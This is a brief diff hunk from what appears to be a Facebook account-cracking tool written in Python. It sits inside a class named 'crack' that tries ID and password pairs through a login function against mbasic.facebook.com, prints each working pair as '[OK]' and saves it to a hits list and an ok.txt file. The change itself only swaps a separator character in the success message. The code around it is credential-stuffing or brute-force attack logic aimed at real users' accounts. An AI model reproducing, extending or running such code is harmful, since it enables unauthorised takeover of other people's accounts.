@@ -532,7 +532,7 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r   [OK]%s %s + %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
